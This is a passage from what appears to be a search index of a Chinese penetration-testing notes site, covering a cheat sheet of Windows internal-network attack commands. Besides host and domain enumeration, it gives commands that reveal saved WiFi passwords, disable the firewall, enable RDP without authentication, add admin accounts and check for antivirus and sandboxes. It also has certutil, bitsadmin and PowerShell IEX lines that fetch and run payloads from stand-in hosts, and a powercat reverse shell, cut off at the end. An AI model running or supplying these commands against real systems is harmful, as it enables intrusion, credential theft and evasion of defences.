';`$sb=([text.encoding]::UTF8).GetBytes(`$sb2);`$sm.Write(`$sb,0,`$sb.Length);`$sm.Flush()}\"\",0,true); wmic \u67e5\u6740\u8f6f WMIC /namespace:\\\\root\\securitycenter2 path antivirusproduct GET displayName,productState, pathToSignedProductExe WMIC /Node:localhost /Namespace:\\\\root\\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List \u5f003389 REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal\" \"Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f wmic RDTOGGLE WHERE ServerName='%COMPUTERNAME%' call SetAllowTSConnections 1 wmic /namespace:\\\\root\\cimv2\\terminalservices path win32_tsgeneralsetting where (TerminalName ='RDP-Tcp') call setuserauthenticationrequired 0 \u5e38\u89c1\u6740\u8f6f\u8fdb\u7a0b\u540d https://blog.csdn.net/weixin_39997829/article/details/92666552 cmd\u4e0b\u8f7d bitsadmin /transfer n http://www.xx.com/code.jpg c:\\users\\sdyp\\desktop\\ff.jpg C:\\Temp>certutil.exe -urlcache -split -f \"https://hackers.home/badcontent.txt\" bad.txt C:\\Temp>certutil.exe -decode bad.txt bad.exe \u83b7\u53d6\u76d8\u7b26 wmic logicaldisk where drivetype=3 get deviceid ps cs \u4e0a\u7ebf powershell.exe -c IEX((new-object net.webclient).downloadstring('http://xxx/a.ps1')) powershell -exec bypass -c \"(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://webserver/payload.ps1')|iex\" powershell -exec bypass -f \\\\webdavserver\\folder\\payload.ps1 (smb) \u67e5\u770b\u5f00\u673a\u81ea\u542f Reg query HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run Reg query HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run \u83b7\u53d6\u9065\u6d4b\u4efb\u52a1 Reg query HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\TelemetryController\\Appraiser \u53cd\u75c5\u6bd2\u68c0\u6d4b Get-WmiObject -Namespace root\\SecurityCenter2 -Class AntiVirusProduct \u6839\u636e\u7cfb\u7edf\u7684\u4e0d\u540c\uff0c\u53cd\u75c5\u6bd2\u8f6f\u4ef6\u901a\u5e38\u4f1aWMI\u4e2d\u6ce8\u518c\u4e3a AntiVirusProduct \uff0c\u4fdd\u5b58\u5728 root\\SecurityCenter \u6216 root\\SecurityCenter2 \u547d\u540d\u7a7a\u95f4\u4e2d\u3002 \u7b80\u5355\u7684\u6c99\u76d2&\u865a\u62df\u673a\u68c0\u6d4b \u6c99\u76d2\u5f80\u5f80\u662f\u5355\u6838\u4e14\u5185\u5b58\u5c0f\u4e8e2g\uff0c\u53ef\u4ee5\u4ee5\u6b64\u4e3a\u51ed\u636e\u68c0\u6d4b Get-WmiObject -Class Win32_ComputerSystem NumberOfLogicalProcessors,TotalPhysicalMemory VMWARE\u865a\u62df\u673a\u5982\u4eca\u7528\u7684\u6bd4\u8f83\u591a\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u68c0\u6d4b\u8fdb\u7a0b\u4e2d\u662f\u5426\u5b58\u5728vmtoolsd\u4ee5\u53caBIOS\u5c5e\u6027\u91cc\u662f\u5426\u6709VMWARE\u5b57\u6837\u6765\u5224\u65ad\u662f\u5426\u662fVMWARE\u865a\u62df\u673a Get-WmiObject Win32_BIOS -Filter 'SerialNumber Like \"%VMware%\"' Get-WmiObject Win32_NetworkAdapter -Filter 'Manufacturer LIKE \"%VMware%\" OR Name LIKE \"%VMware%\"'","title":"windows\u5185\u7f51\u6e17\u900f\u5e38\u7528\u547d\u4ee4\u603b\u6c47"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/windows%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%80%BB%E6%B1%87/windows%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%80%BB%E6%B1%87/#windows","text":"","title":"windows\u5185\u7f51\u6e17\u900f\u5e38\u7528\u547d\u4ee4\u603b\u6c47"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/windows%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%80%BB%E6%B1%87/windows%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%80%BB%E6%B1%87/#_1","text":"\u6b63\u6587 \u67e5\u8be2\u7f51\u7edc\u914d\u7f6e\u4fe1\u606f \u67e5\u8be2\u672c\u673a\u7684\u670d\u52a1\u4fe1\u606f \u67e5\u8be2\u7cfb\u7edf\u4fe1\u606f \u8fde\u63a5\u8fc7\u7684WIFI\u53ca\u5bc6\u7801 \u67e5\u8be2\u8fdb\u7a0b\u5217\u8868 \u67e5\u770b\u8ba1\u5212\u4efb\u52a1 \u67e5\u770b\u4e3b\u673a\u5f00\u673a\u65f6\u95f4 \u7528\u6237\u76f8\u5173 \u67e5\u770b\u7aef\u53e3\u5217\u8868 \u67e5\u770b\u5df2\u6253\u8865\u4e01 \u67e5\u770b\u5171\u4eab\u5217\u8868 \u8def\u7531\u8868\u548carp\u9ad8\u901f\u7f13\u5b58\u8868 \u9632\u706b\u5899 \u6743\u9650\u67e5\u770b \u5224\u65ad\u662f\u5426\u5b58\u5728\u57df \u67e5\u770b\u57df\u7684\u540d\u5b57 \u63a2\u6d4b\u57df\u5185\u5b58\u6d3b\u4e3b\u673a \u626b\u63cf\u57df\u5185\u5f00\u653e\u7aef\u53e3 \u57df\u5185\u57fa\u672c\u4fe1\u606f \u57df\u7528\u6237\u4fe1\u606f\u6536\u96c6 \u672c\u673awmic\u67e5\u6740\u8f6f \u5f003389 \u7528\u6237\u589e\u5220\u6539\u67e5 \u4e00\u4e9b\u559c\u6b22\u7528\u7684 ps cs \u4e0a\u7ebf \u67e5\u770b\u5f00\u673a\u81ea\u542f \u83b7\u53d6\u9065\u6d4b\u4efb\u52a1 \u53cd\u75c5\u6bd2\u68c0\u6d4b \u7b80\u5355\u7684\u6c99\u76d2&\u865a\u62df\u673a\u68c0\u6d4b","title":"\u76ee\u5f55"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/windows%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%80%BB%E6%B1%87/windows%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%80%BB%E6%B1%87/#_2","text":"\u524d\u51e0\u5929\u9762\u8bd5\u7684\u65f6\u5019\u88ab\u5e08\u5085\u95ee\u5230\u4e86\u8fd9\u4e2a\u95ee\u9898\uff0c\u5f53\u65f6\u4e0d\u662f\u5f88\u4f1a\uff0c\u73b0\u5728\u6765\u5b66\u5b66","title":"\u6b63\u6587"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/windows%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%80%BB%E6%B1%87/windows%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%80%BB%E6%B1%87/#_3","text":"ipconfig /all","title":"\u67e5\u8be2\u7f51\u7edc\u914d\u7f6e\u4fe1\u606f"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/windows%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%80%BB%E6%B1%87/windows%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%80%BB%E6%B1%87/#_4","text":"wmic service list brief","title":"\u67e5\u8be2\u672c\u673a\u7684\u670d\u52a1\u4fe1\u606f"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/windows%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%80%BB%E6%B1%87/windows%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%80%BB%E6%B1%87/#_5","text":"systeminfo","title":"\u67e5\u8be2\u7cfb\u7edf\u4fe1\u606f"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/windows%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%80%BB%E6%B1%87/windows%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%80%BB%E6%B1%87/#wifi","text":"for /f \"skip=9 tokens=1,2 delims=:\" %i in ('netsh wlan show profiles') do @echo %j | findstr -i -v echo | netsh wlan show profiles %j key=clear","title":"\u8fde\u63a5\u8fc7\u7684WIFI\u53ca\u5bc6\u7801"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/windows%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%80%BB%E6%B1%87/windows%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%80%BB%E6%B1%87/#_6","text":"tasklist / wmic process list brief","title":"\u67e5\u8be2\u8fdb\u7a0b\u5217\u8868"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/windows%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%80%BB%E6%B1%87/windows%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%80%BB%E6%B1%87/#_7","text":"schtasks /query /fo LIST /v \u5217\u51fa\u8ba1\u5212\u4efb\u52a1\u8be6\u7ec6\u4fe1\u606f","title":"\u67e5\u770b\u8ba1\u5212\u4efb\u52a1"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/windows%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%80%BB%E6%B1%87/windows%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%80%BB%E6%B1%87/#_8","text":"net statistics workstation","title":"\u67e5\u770b\u4e3b\u673a\u5f00\u673a\u65f6\u95f4"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/windows%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%80%BB%E6%B1%87/windows%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%80%BB%E6%B1%87/#_9","text":"net user \u67e5\u770b\u6240\u6709\u7528\u6237 net localgroup administrators \u83b7\u53d6\u672c\u5730\u7ba1\u7406\u5458\u4fe1\u606f","title":"\u7528\u6237\u76f8\u5173"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/windows%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%80%BB%E6%B1%87/windows%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%80%BB%E6%B1%87/#_10","text":"netstat -ano","title":"\u67e5\u770b\u7aef\u53e3\u5217\u8868"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/windows%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%80%BB%E6%B1%87/windows%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%80%BB%E6%B1%87/#_11","text":"wmic qfe get Caption,Description,HotFixID,InstalledOn","title":"\u67e5\u770b\u5df2\u6253\u8865\u4e01"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/windows%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%80%BB%E6%B1%87/windows%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%80%BB%E6%B1%87/#_12","text":"net share \u67e5\u770b\u672c\u673a\u5171\u4eab\u5217\u8868\u548c\u53ef\u8bbf\u95ee\u7684\u57df\u5171\u4eab\u5217\u8868 wmic share get name,path,status \u67e5\u627e\u5171\u4eab\u5217\u8868","title":"\u67e5\u770b\u5171\u4eab\u5217\u8868"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/windows%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%80%BB%E6%B1%87/windows%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%80%BB%E6%B1%87/#arp","text":"route print \u8def\u7531\u8868 arp -a arp\u9ad8\u901f\u7f13\u5b58\u8868","title":"\u8def\u7531\u8868\u548carp\u9ad8\u901f\u7f13\u5b58\u8868"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/windows%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%80%BB%E6%B1%87/windows%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%80%BB%E6%B1%87/#_13","text":"netsh firewall set opmode disable \u5173\u95ed\u9632\u706b\u5899(Windows Server 2003 \u4ee5\u524d\u7684\u7248\u672c) netsh advfirewall set allprofiles state off \u5173\u95ed\u9632\u706b\u5899(Windows Server 2003 \u4ee5\u540e\u7684\u7248\u672c) netsh firewall show config \u67e5\u770b\u9632\u706b\u5899\u914d\u7f6e \u5982\u679c\u4e0a\u9762\u7684\u547d\u4ee4\u88ab\u5f03\u7528\uff0c\u5219\u4f7f\u7528 netsh advfirewall firewall show rule name=all \u6839\u636e\u53c2\u8003\uff0c\u53ef\u4ee5\u4f7f\u7528\u8fd9\u4e2awmic\u4e00\u952e\u83b7\u53d6\u672c\u673a\u4fe1\u606f http://www.fuzzysecurity.com/scripts/files/wmic_info.rar","title":"\u9632\u706b\u5899"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/windows%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%80%BB%E6%B1%87/windows%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%80%BB%E6%B1%87/#_14","text":"whoami /all \u67e5\u770b\u81ea\u5df1\u7684\u8be6\u7ec6\u6743\u9650 net user xxx /domain \u67e5\u770b\u57df\u5185\u6307\u5b9a\u7528\u6237\u7684\u6743\u9650","title":"\u6743\u9650\u67e5\u770b"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/windows%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%80%BB%E6%B1%87/windows%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%80%BB%E6%B1%87/#_15","text":".net time /domain \u82e5\u51fa\u73b0\u4ee5\u4e0b\u60c5\u51b5\u5219\u4e0d\u5b58\u5728\u57df \u82e5\u662f\u62a5\u9519\uff1a\u53d1\u751f\u7cfb\u7edf\u9519\u8bef5\uff0c\u5219\u5b58\u5728\u57df\uff0c\u4f46\u8be5\u7528\u6237\u4e0d\u662f\u57df\u7528\u6237 \u82e5\u662f\u4ee5\u4e0b\u60c5\u51b5\u5219\u8bf4\u660e\u5b58\u5728\u57df\u4e14\u5df2\u7ecf\u5728\u57df\u4e2d","title":"\u5224\u65ad\u662f\u5426\u5b58\u5728\u57df"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/windows%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%80%BB%E6%B1%87/windows%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%80%BB%E6%B1%87/#_16","text":"net config workstation nslookup -type=srv ldap. tcp \u8fd9\u4e2a\u5f88\u723d\uff0c\u57df\u63a7\u4e3b\u673a\u540d\u548cIP\u4e00\u5757\u5f04\u51fa\u6765\u4e86","title":"\u67e5\u770b\u57df\u7684\u540d\u5b57"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/windows%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%80%BB%E6%B1%87/windows%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%80%BB%E6%B1%87/#_17","text":"1.\u4f7f\u7528\u5de5\u5177 nbtscan http://www.unixwiz.net/tools/nbtscan.html 2.\u67e5\u770barp\u9ad8\u901f\u7f13\u5b58\u8868 arp -a 3.ICMP\u534f\u8bae\u63a2\u6d4b\uff08\u9010\u4e2aping\uff09 \u8fd9\u4e2a\u8d3c\u6162\uff0c\u4f46\u662f\u4e0d\u7528\u4e0b\u8f7d\u5176\u4ed6\u5e94\u7528 for /L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.1.%I | findstr \"TTL\" 4.nmap\u76f4\u63a5\u5f00\u626b 5.meterpreter\u4f1a\u8bdd\u4e2d\u6267\u884c run windows/gather/enum_ad_computers","title":"\u63a2\u6d4b\u57df\u5185\u5b58\u6d3b\u4e3b\u673a"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/windows%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%80%BB%E6%B1%87/windows%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%80%BB%E6%B1%87/#_18","text":"1.nmap nmap 192.168.1.0/24 2.\u5de5\u5177 S\u626b\u63cf\u5668 3.\u81ea\u5199\u811a\u672c #python3 \u6162\u7684\u4e00\u6279 import socket def get_ip_status(ip,port): server = socket.socket(socket.AF_INET, socket.SOCK_STREAM) try: server.connect((ip,port)) print('{0} port {1} is open'.format(ip, port)) except Exception as err: print('{0} port {1} is not open'.format(ip,port)) finally: server.close() if __name__ == '__main__': host = '172.16.0.198' for port in range(20,100): get_ip_status(host,port)","title":"\u626b\u63cf\u57df\u5185\u5f00\u653e\u7aef\u53e3"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/windows%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%80%BB%E6%B1%87/windows%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%80%BB%E6%B1%87/#_19","text":"net group \u201cdomain computers\u201d /domain \u67e5\u8be2\u6240\u6709\u57df\u6210\u5458\u8ba1\u7b97\u673a\u5217\u8868 net view /domain:HACHE \u67e5\u8be2\u57df\u5185\u6240\u6709\u4e3b\u673a net accounts /domain \u83b7\u53d6\u57df\u5bc6\u7801\u4fe1\u606f nltest /domain_trusts \u83b7\u53d6\u57df\u4fe1\u4efb\u4fe1\u606f nltest /DCLIST:hacke \u67e5\u770b\u57df\u63a7\u5236\u5668\u673a\u5668\u540d Nslookup -type=SRV_ldap._tcp \u67e5\u770b\u57df\u63a7\u5236\u5668\u7684\u4e3b\u673a\u540d","title":"\u57df\u5185\u57fa\u672c\u4fe1\u606f"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/windows%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%80%BB%E6%B1%87/windows%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%80%BB%E6%B1%87/#_20","text":"net user /domain \u5411\u57df\u63a7\u5236\u5668\u67e5\u8be2\u57df\u5185\u7528\u6237\u5217\u8868 wmic useraccount get /all \u83b7\u53d6\u57df\u5185\u7528\u6237\u8be6\u7ec6\u4fe1\u606f net localgroup administrators \u67e5\u8be2\u672c\u5730\u7ba1\u7406\u5458\u7528\u6237 net group \u201cdomain admins\u201d /domain \u67e5\u8be2\u57df\u7ba1\u7406\u5458\u7528\u6237 net group \u201cEnterprise admins\u201d /domain \u67e5\u8be2\u7ba1\u7406\u5458\u7528\u6237\u7ec4","title":"\u57df\u7528\u6237\u4fe1\u606f\u6536\u96c6"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/windows%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%80%BB%E6%B1%87/windows%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%80%BB%E6%B1%87/#wmic","text":"WMIC /Node:localhost /Namespace:\\\\root\\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List or WMIC /namespace:\\root\\securitycenter2 path antivirusproduct GET displayName,productState, pathToSignedProductExe","title":"\u672c\u673awmic\u67e5\u6740\u8f6f"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/windows%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%80%BB%E6%B1%87/windows%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%80%BB%E6%B1%87/#3389","text":"REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal\u201d \u201cServer /v fDenyTSConnections /t REG_DWORD /d 0 /f","title":"\u5f003389"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/windows%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%80%BB%E6%B1%87/windows%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%80%BB%E6%B1%87/#_21","text":"net user username password /add \u52a0\u7528\u6237 net localgroup administrators username /add \u6dfb\u52a0XX\u5230\u7ba1\u7406\u5458\u8d26\u6237","title":"\u7528\u6237\u589e\u5220\u6539\u67e5"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/windows%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%80%BB%E6%B1%87/windows%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%80%BB%E6%B1%87/#_22","text":"Windows \u53cd\u5f39shell powershell IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c 192.168.1.4 -p 9999 -e cmd powershell IEX (New-Object 